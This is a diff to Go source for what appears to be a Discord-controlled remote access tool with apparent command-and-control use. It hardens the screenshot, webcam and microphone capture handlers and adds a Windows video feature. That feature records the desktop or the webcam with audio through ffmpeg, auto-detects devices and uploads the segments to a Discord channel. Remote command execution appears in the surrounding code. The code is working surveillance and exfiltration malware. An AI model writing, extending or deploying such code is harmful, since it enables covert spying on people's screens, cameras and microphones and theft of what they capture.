@@ -36,6 +36,20 @@ var (
 	logStreamSession   *discordgo.Session
 	logStreamChannelID string
 	logStreamMutex     sync.Mutex
+
+	videoStateMutex sync.Mutex
+	videoState      = struct {
+		Status    string
+		Cmd       *exec.Cmd
+		Stdin     io.WriteCloser
+		ChannelID string
+		Source    string
+		StartTime time.Time
+		StopTime  time.Time
+		Reason    string
+	}{
+		Status: "idle",
+	}
 )
 
 func (w *discordLogWriter) Write(p []byte) (int, error) {
@@ -215,15 +229,37 @@ func handleScreenshot(s *discordgo.Session, channelID string, ref *discordgo.Mes
 		img, _ := screenshot.CaptureRect(bounds)
 
 		fileName := fmt.Sprintf("%s%d_%dx%d.png", getTmpDir(), i, bounds.Dx(), bounds.Dy())
-		file, _ := os.Create(fileName)
-		png.Encode(file, img)
-		defer file.Close()
-
-		f, _ := os.Open(fileName)
-		defer f.Close()
-		fileStruct := &discordgo.File{Name: fileName, Reader: f}
+		file, err := os.Create(fileName)
+		if err != nil {
+			log.Printf("SCREENSHOT create error for %s: %v", fileName, err)
+			continue
+		}
+		err = png.Encode(file, img)
+		if err != nil {
+			log.Printf("SCREENSHOT encode error for %s: %v", fileName, err)
+			file.Close()
+			continue
+		}
+		file.Close()
+		fi, err := os.Stat(fileName)
+		if err != nil {
+			log.Printf("SCREENSHOT stat error for %s: %v", fileName, err)
+			continue
+		}
+		f, err := os.Open(fileName)
+		if err != nil {
+			log.Printf("SCREENSHOT open error for %s: %v", fileName, err)
+			continue
+		}
+		fileStruct := &discordgo.File{Name: filepath.Base(fileName), Reader: f}
 		fileArray := []*discordgo.File{fileStruct}
-		s.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{Files: fileArray, Reference: ref})
+		_, sendErr := s.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{Files: fileArray, Reference: ref})
+		f.Close()
+		if sendErr != nil {
+			log.Printf("SCREENSHOT discord send error for %s: %v", fileName, sendErr)
+			continue
+		}
+		log.Printf("SCREENSHOT completed file=%s size=%d bytes channel=%s", fileName, fi.Size(), channelID)
 	}
 }
 
@@ -271,15 +307,26 @@ func handleCameraSnapshot(s *discordgo.Session, channelID string, ref *discordgo
 		s.ChannelMessageSendReply(channelID, msg, ref)
 		return
 	}
+	fi, err := os.Stat(fileName)
+	if err != nil {
+		log.Printf("CAMERA stat error for %s: %v", fileName, err)
+		s.ChannelMessageSendReply(channelID, "Cannot stat captured file: "+err.Error(), ref)
+		return
+	}
 	f, err := os.Open(fileName)
 	if err != nil {
 		s.ChannelMessageSendReply(channelID, "Cannot open captured file: "+err.Error(), ref)
 		return
 	}
-	defer f.Close()
 	fileStruct := &discordgo.File{Name: filepath.Base(fileName), Reader: f}
 	fileArray := []*discordgo.File{fileStruct}
-	s.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{Files: fileArray, Reference: ref})
+	_, sendErr := s.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{Files: fileArray, Reference: ref})
+	f.Close()
+	if sendErr != nil {
+		log.Printf("CAMERA discord send error for %s: %v", fileName, sendErr)
+		return
+	}
+	log.Printf("CAMERA completed file=%s size=%d bytes channel=%s", fileName, fi.Size(), channelID)
 }
 
 func handleMicRecord(s *discordgo.Session, channelID string, ref *discordgo.MessageReference, seconds int, destPath string) {
@@ -370,7 +417,6 @@ func handleMicRecord(s *discordgo.Session, channelID string, ref *discordgo.Mess
 		s.ChannelMessageSendReply(channelID, "Cannot open recorded file: "+err.Error(), ref)
 		return
 	}
-	defer f.Close()
 	fileStruct := &discordgo.File{Name: filepath.Base(path), Reader: f}
 	fileArray := []*discordgo.File{fileStruct}
 	log.Printf("MIC sending file %s to channel=%s", path, channelID)
@@ -379,12 +425,327 @@ func handleMicRecord(s *discordgo.Session, channelID string, ref *discordgo.Mess
 		Files:     fileArray,
 		Reference: ref,
 	})
+	f.Close()
 	if sendErr != nil {
 		log.Printf("MIC discord send error for %s: %v", path, sendErr)
 		s.ChannelMessageSendReply(channelID, "Upload failed: "+sendErr.Error(), ref)
 		return
 	}
-	log.Printf("MIC send completed for channel=%s path=%s", channelID, path)
+	log.Printf("MIC send completed for channel=%s path=%s size=%d bytes", channelID, path, fi.Size())
+}
+
+func handleVideoRecord(s *discordgo.Session, channelID string, ref *discordgo.MessageReference, source string, maxSizeMB int, maxParts int, totalSeconds int, quality string) {
+	log.Printf("VIDEO start: channel=%s source=%s maxSizeMB=%d maxParts=%d totalSeconds=%d quality=%s os=%s", channelID, source, maxSizeMB, maxParts, totalSeconds, runtime.GOOS)
+	videoStateMutex.Lock()
+	if videoState.Status == "recording" || videoState.Status == "stopping" {
+		videoStateMutex.Unlock()
+		s.ChannelMessageSendReply(channelID, "Another recording is already in progress for this device.", ref)
+		return
+	}
+	videoState.Status = "recording"
+	videoState.ChannelID = channelID
+	videoState.Source = source
+	videoState.StartTime = time.Now()
+	videoState.StopTime = time.Time{}
+	videoState.Reason = ""
+	videoState.Cmd = nil
+	if videoState.Stdin != nil {
+		videoState.Stdin.Close()
+		videoState.Stdin = nil
+	}
+	videoStateMutex.Unlock()
+	if runtime.GOOS != "windows" {
+		s.ChannelMessageSendReply(channelID, "Video recording is only implemented for Windows.", ref)
+		videoStateMutex.Lock()
+		videoState.Status = "idle"
+		videoStateMutex.Unlock()
+		return
+	}
+	if maxSizeMB <= 0 {
+		maxSizeMB = 2
+	}
+	if maxSizeMB > 8 {
+		maxSizeMB = 8
+	}
+	if maxParts <= 0 {
+		maxParts = 1
+	}
+	if maxParts > 30 {
+		maxParts = 30
+	}
+	if quality != "low" && quality != "medium" && quality != "high" {
+		quality = "medium"
+	}
+	if !ensureFFmpegAvailable(s, channelID, ref) {
+		log.Printf("VIDEO ffmpeg unavailable on Windows")
+		videoStateMutex.Lock()
+		videoState.Status = "idle"
+		videoState.Reason = "ffmpeg_unavailable"
+		videoState.StopTime = time.Now()
+		videoStateMutex.Unlock()
+		return
+	}
+	var inputArgs []string
+	if source == "camera" {
+		videoDevice := os.Getenv("DC2_CAMERA_DEVICE")
+		if videoDevice == "" {
+			detected := detectWindowsDShowDevice("video")
+			if detected != "" {
+				videoDevice = detected
+			} else {
+				log.Printf("VIDEO camera: no Windows video device detected; DC2_CAMERA_DEVICE not set")
+				s.ChannelMessageSendReply(channelID, "No Windows camera device detected. Set DC2_CAMERA_DEVICE to a valid DirectShow video device name.", ref)
+				videoStateMutex.Lock()
+				videoState.Status = "idle"
+				videoState.Reason = "no_camera_device"
+				videoState.StopTime = time.Now()
+				videoStateMutex.Unlock()
+				return
+			}
+		}
+		audioDevice := os.Getenv("DC2_MIC_DEVICE")
+		if audioDevice == "" {
+			detectedAudio := detectWindowsDShowDevice("audio")
+			if detectedAudio != "" {
+				audioDevice = detectedAudio
+			} else {
+				log.Printf("VIDEO camera: no Windows audio device detected; DC2_MIC_DEVICE not set")
+				s.ChannelMessageSendReply(channelID, "No Windows microphone device detected. Set DC2_MIC_DEVICE to a valid DirectShow audio device name.", ref)
+				videoStateMutex.Lock()
+				videoState.Status = "idle"
+				videoState.Reason = "no_audio_device"
+				videoState.StopTime = time.Now()
+				videoStateMutex.Unlock()
+				return
+			}
+		}
+		log.Printf("VIDEO camera ffmpeg devices: video=%s audio=%s", videoDevice, audioDevice)
+		inputArgs = []string{"-f", "dshow", "-i", videoDevice, "-f", "dshow", "-i", audioDevice}
+	} else if source == "screen" {
+		log.Printf("VIDEO screen ffmpeg source=desktop (gdigrab)")
+		inputArgs = []string{"-f", "gdigrab", "-i", "desktop"}
+	} else {
+		log.Printf("VIDEO unsupported source: %s", source)
+		s.ChannelMessageSendReply(channelID, "Unsupported video source. Use camera or screen.", ref)
+		return
+	}
+	var crf string
+	switch quality {
+	case "low":
+		crf = "30"
+	case "high":
+		crf = "23"
+	default:
+		crf = "28"
+	}
+	maxBytes := int64(maxSizeMB) * 1024 * 1024
+	remainingSeconds := totalSeconds
+	sessionStamp := time.Now().UnixNano()
+	for part := 1; part <= maxParts; part++ {
+		fileName := fmt.Sprintf("%srecord_%d_part%d.mp4", getTmpDir(), sessionStamp, part)
+		args := []string{"-y"}
+		args = append(args, inputArgs...)
+		if remainingSeconds > 0 && maxParts > 0 {
+			perPart := remainingSeconds / (maxParts - part + 1)
+			if perPart < 5 {
+				perPart = 5
+			}
+			args = append(args, "-t", fmt.Sprintf("%d", perPart))
+			remainingSeconds -= perPart
+			if remainingSeconds < 0 {
+				remainingSeconds = 0
+			}
+		}
+		args = append(args,
+			"-vcodec", "libx264",
+			"-preset", "veryfast",
+			"-crf", crf,
+			"-pix_fmt", "yuv420p",
+			"-r", "25",
+			"-acodec", "aac",
+			"-b:a", "96k",
+			"-ar", "44100",
+			"-ac", "2",
+			"-fs", fmt.Sprintf("%d", maxBytes),
+			fileName,
+		)
+		log.Printf("VIDEO running ffmpeg part=%d: %v", part, args)
+		cmd := exec.Command("ffmpeg", args...)
+		stdin, _ := cmd.StdinPipe()
+		videoStateMutex.Lock()
+		if videoState.Status != "recording" || videoState.ChannelID != channelID {
+			videoStateMutex.Unlock()
+			if stdin != nil {
+				stdin.Close()
+			}
+			return
+		}
+		videoState.Cmd = cmd
+		videoState.Stdin = stdin
+		videoStateMutex.Unlock()
+		out, err := cmd.CombinedOutput()
+		videoStateMutex.Lock()
+		stopping := videoState.Status == "stopping"
+		videoStateMutex.Unlock()
+		if err != nil {
+			log.Printf("VIDEO ffmpeg error on part %d: %v", part, err)
+			if len(out) > 0 {
+				log.Printf("VIDEO ffmpeg stderr part %d: %s", part, string(out))
+			}
+			if !stopping {
+				msg := fmt.Sprintf("Video recording failed on part %d", part)
+				if len(out) > 0 {
+					if len(out) > 300 {
+						out = out[:300]
+					}
+					msg = msg + ": " + string(out)
+				} else {
+					msg = msg + ": " + err.Error()
+				}
+				s.ChannelMessageSendReply(channelID, msg, ref)
+				videoStateMutex.Lock()
+				videoState.Status = "idle"
+				videoState.Reason = "error"
+				videoState.StopTime = time.Now()
+				videoState.Cmd = nil
+				if videoState.Stdin != nil {
+					videoState.Stdin.Close()
+					videoState.Stdin = nil
+				}
+				videoStateMutex.Unlock()
+				return
+			}
+		}
+		fi, statErr := os.Stat(fileName)
+		if statErr != nil {
+			log.Printf("VIDEO stat error for %s: %v", fileName, statErr)
+			s.ChannelMessageSendReply(channelID, "Cannot stat recorded video file: "+statErr.Error(), ref)
+			videoStateMutex.Lock()
+			videoState.Status = "idle"
+			videoState.Reason = "stat_error"
+			videoState.StopTime = time.Now()
+			videoState.Cmd = nil
+			if videoState.Stdin != nil {
+				videoState.Stdin.Close()
+				videoState.Stdin = nil
+			}
+			videoStateMutex.Unlock()
+			return
+		}
+		if fi.Size() == 0 {
+			log.Printf("VIDEO zero-byte file at %s", fileName)
+			s.ChannelMessageSendReply(channelID, "Recorded video file is empty (0 bytes).", ref)
+			videoStateMutex.Lock()
+			videoState.Status = "idle"
+			videoState.Reason = "empty_file"
+			videoState.StopTime = time.Now()
+			videoState.Cmd = nil
+			if videoState.Stdin != nil {
+				videoState.Stdin.Close()
+				videoState.Stdin = nil
+			}
+			videoStateMutex.Unlock()
+			return
+		}
+		if fi.Size() > maxBytes {
+			log.Printf("VIDEO file hit max size limit: size=%d bytes limit=%d", fi.Size(), maxBytes)
+		}
+		f, openErr := os.Open(fileName)
+		if openErr != nil {
+			log.Printf("VIDEO open error for %s: %v", fileName, openErr)
+			s.ChannelMessageSendReply(channelID, "Cannot open recorded video file: "+openErr.Error(), ref)
+			videoStateMutex.Lock()
+			videoState.Status = "idle"
+			videoState.Reason = "open_error"
+			videoState.StopTime = time.Now()
+			videoState.Cmd = nil
+			if videoState.Stdin != nil {
+				videoState.Stdin.Close()
+				videoState.Stdin = nil
+			}
+			videoStateMutex.Unlock()
+			return
+		}
+		log.Printf("VIDEO sending segment %d file %s size=%d bytes to channel=%s", part, fileName, fi.Size(), channelID)
+		fileStruct := &discordgo.File{Name: filepath.Base(fileName), Reader: f}
+		fileArray := []*discordgo.File{fileStruct}
+		_, sendErr := s.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{
+			Content:   fmt.Sprintf("🎬 Video segment %d ready (%d bytes): %s", part, fi.Size(), filepath.Base(fileName)),
+			Files:     fileArray,
+			Reference: ref,
+		})
+		f.Close()
+		if sendErr != nil {
+			log.Printf("VIDEO discord send error for %s: %v", fileName, sendErr)
+			s.ChannelMessageSendReply(channelID, "Upload failed for segment "+fmt.Sprint(part)+": "+sendErr.Error(), ref)
+			videoStateMutex.Lock()
+			videoState.Status = "idle"
+			videoState.Reason = "upload_error"
+			videoState.StopTime = time.Now()
+			videoState.Cmd = nil
+			if videoState.Stdin != nil {
+				videoState.Stdin.Close()
+				videoState.Stdin = nil
+			}
+			videoStateMutex.Unlock()
+			return
+		}
+		log.Printf("VIDEO segment %d send completed for channel=%s path=%s", part, channelID, fileName)
+		if stopping {
+			break
+		}
+	}
+	videoStateMutex.Lock()
+	videoState.Status = "idle"
+	if videoState.Reason == "" {
+		videoState.Reason = "completed"
+	}
+	videoState.StopTime = time.Now()
+	videoState.Cmd = nil
+	if videoState.Stdin != nil {
+		videoState.Stdin.Close()
+		videoState.Stdin = nil
+	}
+	elapsed := videoState.StopTime.Sub(videoState.StartTime)
+	reason := videoState.Reason
+	videoStateMutex.Unlock()
+	log.Printf("VIDEO finished channel=%s reason=%s duration=%s", channelID, reason, elapsed)
+}
+
+func handleVideoStop(s *discordgo.Session, channelID string, ref *discordgo.MessageReference) {
+	videoStateMutex.Lock()
+	if videoState.Status != "recording" || videoState.ChannelID != channelID {
+		videoStateMutex.Unlock()
+		s.ChannelMessageSendReply(channelID, "No active recording to stop for this device.", ref)
+		return
+	}
+	videoState.Status = "stopping"
+	videoState.Reason = "stopped_by_user"
+	cmd := videoState.Cmd
+	stdin := videoState.Stdin
+	videoStateMutex.Unlock()
+	s.ChannelMessageSendReply(channelID, "⏹ Stopping recording...", ref)
+	go func() {
+		if stdin != nil {
+			_, _ = stdin.Write([]byte("q\n"))
+			_ = stdin.Close()
+		} else if cmd != nil && cmd.Process != nil {
+			_ = cmd.Process.Kill()
+		}
+		time.Sleep(5 * time.Second)
+		videoStateMutex.Lock()
+		defer videoStateMutex.Unlock()
+		if videoState.Status == "stopping" && videoState.Cmd != nil && videoState.Cmd.Process != nil {
+			_ = videoState.Cmd.Process.Kill()
+			videoState.Status = "idle"
+			videoState.StopTime = time.Now()
+			videoState.Reason = "stopped_timeout_kill"
+			if videoState.Stdin != nil {
+				videoState.Stdin.Close()
+				videoState.Stdin = nil
+			}
+		}
+	}()
 }
 
 func runCommandString(s *discordgo.Session, channelID string, ref *discordgo.MessageReference, cmdStr string) {
